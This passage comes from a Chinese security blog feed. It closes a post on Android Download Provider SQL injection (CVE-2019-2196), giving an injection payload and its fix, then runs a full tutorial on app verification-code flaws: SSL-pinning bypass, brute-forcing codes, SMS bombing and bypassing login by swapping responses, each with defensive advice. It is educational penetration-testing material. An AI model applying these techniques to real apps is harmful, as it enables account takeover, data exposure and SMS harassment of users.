&#123;</span><br><span class="line">Helpers.validateSelection(selection, sAppReadableColumnsSet);</span><br></pre></td></tr></table></figure><h3 id="2-Android-Download-Provider上的SQL注入——sort参数（CVE-2019-2196）"><a href="#2-Android-Download-Provider上的SQL注入——sort参数（CVE-2019-2196）" class="headerlink" title="2.Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）"></a>2.Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）</h3><h4 id="（1）漏洞原理-4"><a href="#（1）漏洞原理-4" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>同样是针对Download Provider，因为被授予<code>android.permission.INTERNET</code>权限的恶意应用可以在<code>query()</code>方法的<code>sort</code>参数（<code>ORDER BY</code>子句）中附加一个包含子查询语句的<code>LIMIT</code>子句，实施SQL注入攻击，从而检索Download Provider内部数据库的所有条目。</p><h4 id="（2）漏洞复现-4"><a href="#（2）漏洞复现-4" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>可以构造sql注入语句：</p><p><code>sort</code>参数传入的值是<code>ORDER BY</code>子句后拼接的内容，为了利用此漏洞，可以在<code>sort</code>参数处构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">columnName</span><br><span class="line">limit</span><br><span class="line"><span class="keyword">case</span> <span class="title function_">when</span> <span class="params">(condition)</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end</span><br><span class="line">例如：</span><br><span class="line">_id limit <span class="keyword">case</span> <span class="title function_">when</span><span class="params">(</span></span><br><span class="line"><span class="params">    (select count(*)</span> from downloads)&gt;<span class="number">0</span></span><br><span class="line">)</span><br><span class="line">then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end</span><br></pre></td></tr></table></figure><p>这里详细的复现过程可以参考文章：<a href="https://zhuanlan.zhihu.com/p/367365614">Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）</a></p><h4 id="（3）安全防护-1"><a href="#（3）安全防护-1" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>确保执行数据库操作前合理校验query()方法的sort参数。例如，确保sort参数不包含注入了LIMIT子句和潜在的恶意子查询语句的恶意payload，或者执行更严格的校验，比如要求参数仅包含以逗号分隔的现有数据列列表和字符串“asc”或“desc”。</p><p>DownloadProvider.java文件添加代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(<span class="keyword">final</span> Uri uri, String[] projection,</span></span><br><span class="line"><span class="params">         <span class="keyword">final</span> String selection, <span class="keyword">final</span> String[] selectionArgs,</span></span><br><span class="line"><span class="params">         <span class="keyword">final</span> String sort)</span> &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (shouldRestrictVisibility()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sort != <span class="literal">null</span> &amp;&amp; sort.toLowerCase(Locale.ENGLISH).contains(<span class="string">&quot;limit&quot;</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;invalid sort&quot;</span>);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>本文通过总结和学习，初步的将讲解了Android平台APP上的常见的Sql注入的方式，并使用一些案例进行了一一的列举，文中一部分漏洞没有找到合适的案例，大家可以参考对应作者的博客，后续相关的实验材料上传github和知识星球</p><p>github网址：<a href="https://github.com/WindXaa/Android-Vulnerability-Mining">WindXaa</a></p><h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><p>sql注入漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/li-xin-yi/SQL-inject-demo</span><br><span class="line">https://security-summer-labs.readthedocs.io/en/latest/lab8/readme.html#task-1-sql-injection-attack-on-select-statement</span><br><span class="line">https://chowdera.com/2022/02/202202060538187242.html</span><br><span class="line">https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/</span><br><span class="line">https://cloud.tencent.com/developer/article/1580824</span><br></pre></td></tr></table></figure><p>DownLoad Provider漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/367365614</span><br><span class="line">https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</span><br><span class="line">https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;最近一直很忙碌，即将进入本系列文章基础篇的最后几个篇章，本文主要讲述Android中存在的常见的SQL注入漏洞的方式，以及如何快速的挖掘SQL注入漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（17）——验证码漏洞挖掘详解</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0017/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0017/</id>
    <published>2023-02-14T01:04:19.000Z</published>
    <updated>2023-12-23T09:13:44.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>验证码漏洞也是当下十分常见的APP端漏洞，本文对验证码漏洞原理做了一个初步的讲解，并复现了当下一些常见的验证码相关的漏洞，本文App抓包技术参考了肉丝大佬的书籍安卓Frida逆向和抓包实战</p><span id="more"></span><p>本文第二节主要讲述Android APP端抓包的基础知识</p><p>本文第三节主要讲述APP验证码漏洞的种类和安全场景</p><p>本文第四节主要讲述APP验证码原理，并复现了一些常见的验证码相关漏洞</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><p>APP验证码漏洞挖掘，需要掌握基本的Android抓包技术，现在越来越多的APP开始进行安全防护，所以如何才能绕过一些基本的防护技术，合理的抓取到报文是验证码漏洞挖掘的先决条件。学习下面知识之前，可以先学习<a href="https://bbs.pediy.com/thread-270634.htm">Android APP漏洞之战（6）——HTTP&#x2F;HTTPs通信漏洞详解</a>的基础理论知识。</p><h3 id="1-APP抓包技术详解"><a href="#1-APP抓包技术详解" class="headerlink" title="1.APP抓包技术详解"></a>1.APP抓包技术详解</h3><h4 id="（1）高版本android系统证书导入"><a href="#（1）高版本android系统证书导入" class="headerlink" title="（1）高版本android系统证书导入"></a>（1）高版本android系统证书导入</h4><p><strong>Android4.4后</strong></p><p>开始引入CA证书校验机制，这里先会涉及到Https的单向认证机制</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/1.png"></p><p>上述步骤4就进行证书校验的环节，而这里的证书便是将手机内置的证书和客户端的证书进行校验，来判断是否合法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Https原理：非对称+对称连接</span><br><span class="line">（1）非对称主要是为了传输对称连接所需要密钥和证书校验</span><br><span class="line">（2）对称连接是加密密码可以安全传输，就可以采用对称连接</span><br></pre></td></tr></table></figure><p><strong>Android4.4-Android7.0</strong></p><p>这个阶段，Android系统信任用户下的证书，所以逆向人员可以将抓包工具的证书导入用户目录下，实现对Https的报文抓取，这里案例可以参考<a href="https://bbs.pediy.com/thread-268445.htm">Android协议分析（一）——Fiddler安装和使用 </a></p><p><strong>Android7.0+</strong></p><p>Android7.0后，Android系统不再信任用户目录下证书，只信任根目录下证书，所以我们要获取HTTPs报文，需要将抓包工具的证书移动到根目录下</p><p>方法一：将文件系统先挂载起来，然后移动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root权限下：</span><br><span class="line">mount -o remount,rw /system</span><br><span class="line">cp * /etc/security/cacerts/</span><br><span class="line">chmod <span class="number">777</span> /etc/security/cacerts<span class="comment">/*</span></span><br><span class="line"><span class="comment">mount -o remount,ro /system</span></span><br><span class="line"><span class="comment">reboot</span></span><br></pre></td></tr></table></figure><p>方法二：使用Magisk证书模块</p><p><a href="https://github.com/Magisk-Modules-Repo/movecert">Move Certificates</a></p><p>我们只需要将模块安装到Magisk中，这样就可以成功的抓取常规状态下的HTTPs的报文了，这里一定主要抓包时必须保证Android手机时间要正确，否则也会报错</p><h4 id="（2）HTTPs双向认证及解决方案"><a href="#（2）HTTPs双向认证及解决方案" class="headerlink" title="（2）HTTPs双向认证及解决方案"></a>（2）HTTPs双向认证及解决方案</h4><p>Https一般采用单向认证，但是一些特殊的APP在服务端也会对证书进行再次认证，这样的认证机制我们称为HTTPs双向认证</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/2.png"></p><p>上图中步骤5就对客户端证书进行了校验，这里导致我们就算客户端导入了抓包工具的证书并信任，也无法通过服务端的认证</p><p><strong>解决办法：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）获取客户端的证书，可以通过编写hook脚本的方式，获取客户端证书及密码</span><br><span class="line">（2）将客户端证书导入到抓包软件charles中，使得Charles能都获取服务端信任（这里一般可以使用charles、Burpsuit软件）</span><br></pre></td></tr></table></figure><p>方法一：</p><p>这里我们一般可以先去分析开发中进行保护的函数，再对对应的函数进行hook</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如java.security.KeyStore</span><br></pre></td></tr></table></figure><p>这里可以参考肉丝大佬的文章<a href="https://www.anquanke.com/post/id/197657#h3-11">实用FRIDA进阶：内存漫游、hook anywhere、抓包</a></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/3.png"></p><p>这里考虑篇幅问题，给一个参考的实操案例<a href="https://ch3nye.top/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E6%9F%90%E4%BA%A4%E5%8F%8Bapp%E7%9A%84%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81crack/">某交友app的双向认证crack</a></p><p>方法二：</p><p>直接在Apk文件下搜索.p12后缀的文件，这里搜索出来的很有可能就是证书文件，当然有些需要密码的就还是要进行hook了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tree -NCfhl |grep -i p12</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/4.png" alt="image-20220409205835643"></p><h4 id="（3）VPN代理机制"><a href="#（3）VPN代理机制" class="headerlink" title="（3）VPN代理机制"></a>（3）VPN代理机制</h4><p>如果APP中编写了检测代理抓包软件代码，也可能会导致我们抓不到包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(“http.proxyHost”); </span><br><span class="line">System.getProperty(“http.proxyPort”); </span><br></pre></td></tr></table></figure><p>这样我们使用代理软件进行抓包要更加合适，当然也有一些检测VPN的情况，这种直接hook就可以了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/5.png" alt="image-20220410094013590"></p><p>具体如何配置使用，可以参考这篇文章<a href="https://mp.weixin.qq.com/s/ahPbBSfkkBsv4oy265rI2Q">APP流量 “一个都不能少” ！</a></p><p>采用VPN代理进行抓包，和Http中间人抓包有本质区别，VPN抓包本质在网络层和路由层抓包</p><h4 id="（4）SSL-pinning"><a href="#（4）SSL-pinning" class="headerlink" title="（4）SSL pinning"></a>（4）SSL pinning</h4><p>就算我们使用Vpn代理抓包，也解决了证书双向认证的问题，但是在抓包过程中也可能会遇到证书绑定的情况</p><p>证书绑定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">APP在代码段中有有对服务端证书进行对比一致性，如果发现是中间人就会直接终止连接</span><br></pre></td></tr></table></figure><p>这里我们提供一般的解决思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）识别证书绑定</span><br><span class="line">（2）先使用开源框架objection或DroidSSLUnpinning先去简单hook</span><br><span class="line">（3）不成功，再去分析APP使用哪种开发框架，去有针对性的进行hook</span><br><span class="line">（4）如果不知道开发框架，可以采用Hook Java的File构造函数进一步去定位证书绑定代码</span><br></pre></td></tr></table></figure><p>这里用一个简单的实例来说明：</p><p><strong>识别证书绑定：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/6.png" alt="image-20220410095914907"></p><p>当我们解决了单向认证、双向认证、采用代理通信还出现上面的情况，说明APP可能采用了证书绑定</p><p><strong>使用开源框架hook——以objection为例：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/7.png" alt="image-20220410095914907"></p><p>我们直接使用objection的hook或spwan模式就进行证书绑定hook</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hook模式启动：android sslpinning disable</span><br><span class="line">spwan模式启动：objection -g 包名 explore -s &quot;android sslpinning disable&quot;</span><br></pre></td></tr></table></figure><p><strong>针对开发框架，有针对性hook:</strong></p><p>我们需要分析APP采用何种开源框架，如okhttp等，不过这里一般开源hook工具objection已经针对了当下的很多开源框架了，所以如果没有成功，可能是程序进行了混淆，这个时候就需要进一步去hook正确的绑定函数</p><p><strong>未知开源框架：</strong></p><p>我们对File构造函数进行hook，然后可以观察对应的调用链信息，从而分析出证书绑定的函数</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/8.png" alt="image-20220410095914907"></p><p>再针对这里找到的函数进行正确的hook，即可</p><h4 id="（5）VPN-Charles-Burpsuit环境配置"><a href="#（5）VPN-Charles-Burpsuit环境配置" class="headerlink" title="（5）VPN+Charles+Burpsuit环境配置"></a>（5）VPN+Charles+Burpsuit环境配置</h4><p>我们经过上面一系列流程基本可以解决当下常见的安全防护形式，当然针对更加安全的抓包防护策略就需要深入的解决了，这里我们介绍一下本文的抓包环境搭建，一般使用通过VPN+Charles+Burpsuit的组合抓包方式</p><p>首先先配置VPN+Charles的抓包模式</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/9.png" alt="image-20220410101546946"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/10.png" alt="image-20220410101609229"></p><p>然后我们将Charles的流量去导入到Burpsuit中，这样就可以实现组合使用，当然根据实际情况你也可以选择合适抓包工具</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/11.png" alt="image-20220410102252123"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/12.png" alt="image-20220410102431749"></p><h2 id="三、验证码漏洞安全场景和分类"><a href="#三、验证码漏洞安全场景和分类" class="headerlink" title="三、验证码漏洞安全场景和分类"></a>三、验证码漏洞安全场景和分类</h2><h3 id="1-验证码漏洞安全场景"><a href="#1-验证码漏洞安全场景" class="headerlink" title="1.验证码漏洞安全场景"></a>1.验证码漏洞安全场景</h3><p>验证码漏洞一般是APP对验证码没有进行登陆校验等安全防护导致的，攻击者一般可以利用验证码漏洞进行暴力破解实现任意号码登陆、还可以实现短信轰炸、导致验证码泄露、手机号换绑、验证码无限发送风险、万能验证码登录、修改返回包绕过验证码登录等安全问题，验证码漏洞在APP中的影响十分严重，一般会造成严重的经济损失。</p><h3 id="2-验证码漏洞分类"><a href="#2-验证码漏洞分类" class="headerlink" title="2.验证码漏洞分类"></a>2.验证码漏洞分类</h3><p>我们根据上面的描述，可以将验证码漏洞分为如下几类：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/45.png" alt="image-20220411111532796"></p><h2 id="四、验证码漏洞原理分析和复现"><a href="#四、验证码漏洞原理分析和复现" class="headerlink" title="四、验证码漏洞原理分析和复现"></a>四、验证码漏洞原理分析和复现</h2><h3 id="1-验证码暴力破解漏洞"><a href="#1-验证码暴力破解漏洞" class="headerlink" title="1.验证码暴力破解漏洞"></a>1.验证码暴力破解漏洞</h3><h4 id="（1）原理分析"><a href="#（1）原理分析" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>验证码暴力破解漏洞一般是因为用户使用手机号+验证码的方式进行登陆时，短信验证码一般由4-6位数字组成，而且APP并未对验证码做时间和失败次数校验，所以攻击者可以通过这个区间的所有数字进行暴力破解来进行攻击</p><h4 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例：XX APP为例</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/14.png" alt="image-20220410105515919"></p><p>我们打开APP，发现该APP并未对登录号码进行验证，而且返回的验证码是4位验证码，这里我们就十分怀疑是否能进行验证码暴力破解</p><p>然后我们使用上面搭建好的抓包环境，随便输入一个验证码去抓取错误信息</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/15.png" alt="image-20220410105515919"></p><p>我们发现APP根本没有进行证书绑定等安全防护，甚至没对验证码进行加密，我们于是对响应的报文进行攻击</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/16.png" alt="image-20220410105515919"></p><p>然后我们采用100个线程，就暴力破解</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/17.png" alt="image-20220410105515919"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/18.png" alt="image-20220410105515919"></p><p>开始攻击</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/19.png" alt="image-20220410105515919"></p><p>然后我们就成功暴力破解出验证码，这里我们发现还可以输入任意的号码<code>18888888888</code>同样可以成功登录，而且可以获取其他用户的订单信息</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/20.png" alt="image-20220410110251127"></p><p>最后类似漏洞危害，如下</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/21.png" alt="image-20220410110705360"></p><h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）设置验证码时间验证，一般建议为180s</span><br><span class="line">（2）限制单位时间内验证码失败的尝试错误，如5分钟连续失败即锁定账号</span><br><span class="line">（3）对验证码进行加密传输</span><br></pre></td></tr></table></figure><h3 id="2-验证码无限次数发送（短信轰炸）"><a href="#2-验证码无限次数发送（短信轰炸）" class="headerlink" title="2.验证码无限次数发送（短信轰炸）"></a>2.验证码无限次数发送（短信轰炸）</h3><h4 id="（1）原理分析-1"><a href="#（1）原理分析-1" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>验证码无限次数发送、短信轰炸漏洞一般是APP端并没有对手机号码进行次数显示，也未对访问进行时间限制</p><h4 id="（2）漏洞复现-1"><a href="#（2）漏洞复现-1" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>我们首先对上面的APP进行发送验证码，查看响应的报文</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/22.png" alt="image-20220410111915010"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/26.png" alt="image-20220411101714278"></p><p>然后通过暴力破解进行短信轰炸，这里轰炸自己手机号，就轰炸个50次吧</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/24.png" alt="image-20220410112221486"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/25.png" alt="image-20220410112415310"></p><p>我们发现可以验证码无限次数发送，但是无法进行短信轰炸，因为验证码做了60s校验，于是尝试去分析APP代码</p><p>我们将APP拖入GDA分析</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/27.png" alt="image-20220411102019374"></p><p>这里我们发现APP进行360加固保护，我们就使用一代壳脱壳工具Frida_Dump进行脱壳</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/28.png" alt="image-20220411102212716"></p><p>我们定位到相关的代码段:</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/29.png" alt="image-20220411102327963"></p><p>分析了代码逻辑，本来以为可以简单的hook相关的函数，使得验证码60s时间变少，但是发现成功发送后还是显示需要60s后再次发送，这说明这个验证就是根据发送的报文，在服务端进行校验</p><p>我们查看发送的报文：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/30.png" alt="image-20220411104546386"></p><p>我们发现获取验证码就是对应的手机号和time值，很显然我们推测time值是用来校验时间和对应手机号的</p><p>我们分析对应源码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/31.png" alt="image-20220411104714014"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/32.png" alt="image-20220411104815174"></p><p>我们可以清晰发现为什么APP验证码对当前系统时间进行校验，因为有系统时间获取函数</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/33.png" alt="image-20220411104901496"></p><p>同理，我们可以发现验证码校验的一些段落，包括四位验证码等</p><p>最后经过分析，得出就是服务端会对每次发送的手机号和系统时间和手机号编码产生的密钥进行校验，会对60s时间进行校验，以及会对当前手机系统时间进行校验</p><p>这里我们可以简单进行60s间隔的短信轰炸，可以简单实现效果如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/34.png" alt="image-20220411105257847"></p><p>因为现在短信轰炸漏洞越来越少，这里没找到更加合适的案例，这里收集一个大佬写的短信漏洞轰炸的文章，可以参考下：<a href="https://www.anquanke.com/post/id/93878">挖洞技巧：绕过短信&amp;邮箱轰炸限制以及后续</a></p><h4 id="（3）安全防护-1"><a href="#（3）安全防护-1" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(1)增加验证码发送校验时间间隔</span><br><span class="line">(2)采用代理池对ip进行限制</span><br></pre></td></tr></table></figure><h3 id="3-验证码泄露风险与万能验证码漏洞"><a href="#3-验证码泄露风险与万能验证码漏洞" class="headerlink" title="3.验证码泄露风险与万能验证码漏洞"></a>3.验证码泄露风险与万能验证码漏洞</h3><h4 id="（1）原理分析-2"><a href="#（1）原理分析-2" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>验证码执行【找回密码】操作时，输入手机号，获取验证码，服务器会向手机发送验证码，通过burpsuite抓包工具，查看返回的响应数据包中如果包含验证码，则可能导致用户密码恶意重置、绑定手机号被恶意更换等风险</p><p>万能验证码一般是开发在业务未上线的时候为了方便测试用的,上线后忘记删除了,例如[8888 0000 1234](tel:8888 0000 1234)等等</p><h4 id="（2）安全防护"><a href="#（2）安全防护" class="headerlink" title="（2）安全防护"></a>（2）安全防护</h4><p>因为当下这种漏洞较少，这里没有找到合适案例，就只简单介绍下原理了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）禁止验证码在本地客户端生成，应采用服务器端验证码生成机制；</span><br><span class="line">（2）设置验证码的时效性，如180秒过期；</span><br><span class="line">（3）验证码应随机生成，且使用一次即失效。</span><br></pre></td></tr></table></figure><h3 id="4-修改返回包绕过登录漏洞"><a href="#4-修改返回包绕过登录漏洞" class="headerlink" title="4.修改返回包绕过登录漏洞"></a>4.修改返回包绕过登录漏洞</h3><h4 id="（1）原理分析-3"><a href="#（1）原理分析-3" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>在APP验证码测试过程中，我们发现很对APP并未对登录成功的响应报文进行校验，导致我们获取登录成功的响应报文后，就可以通过正确的响应报文实现任意号码的登录，导致信息泄露</p><h4 id="（2）漏洞复现-2"><a href="#（2）漏洞复现-2" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例：XXAPP</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/35.png" alt="image-20220411110615223"></p><p>我们先使用手机号进行正确的登录，同时我们使用burpsuit抓取正确登录的响应信息</p><p><strong>发送的请求：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/36.png" alt="image-20220411110709567"></p><p><strong>响应的报文：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/37.png" alt="image-20220411110756668"></p><p>此时我们可以获取正确响应的报文，我们只需要对在下次登录时对该响应请求进行替换即可</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/38.png" alt="image-20220411110840086"></p><p>此时我们再次登录，这里我们随便输入验证码5555</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/39.png" alt="image-20220411110840086"></p><p>然后我们注意设置对响应进行抓取</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/40.png" alt="image-20220411111006306"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/41.png" alt="image-20220411111006306"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/42.png" alt="image-20220411111055714"></p><p>然后进行替换</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/43.png" alt="image-20220411111136053"></p><p>最后我们替换报文发现成功登录：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/44.png" alt="image-20220411111203716"></p><h4 id="（3）安全防护-2"><a href="#（3）安全防护-2" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不要在前端利用服务端返回的值判断是否可以修改密码 要把整个效验环节交给服务端</span><br></pre></td></tr></table></figure><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文详细的介绍了APP中的抓包技术，以及讲述了当下APP端验证码漏洞挖掘实现的一些常见的方式，验证码漏洞还有更多的漏洞，后续会进一步完善，本文拿了一些实例具体复现了漏洞的挖掘步骤，并提交CNVD获得了一些中高危漏洞，一些更详细资料放在github和星球中</p><p>github首页：<a href="https://github.com/guoxuaa">github</a></p><h2 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h2><p>参考书籍：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">安卓Frida逆向与抓包实战</span><br></pre></td></tr></table></figure><p>验证码漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.52pojie.cn/thread-1613856-1-1.html</span><br><span class="line">https://www.jianshu.com/p/d2b4c6a54d68</span><br><span class="line">https://www.bilibili.com/read/cv4218190</span><br></pre></td></tr></table></figure><p>短信轰炸漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/93878</span><br><span class="line">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614</span><br></pre></td></tr></table></figure>]]></content>
    
    
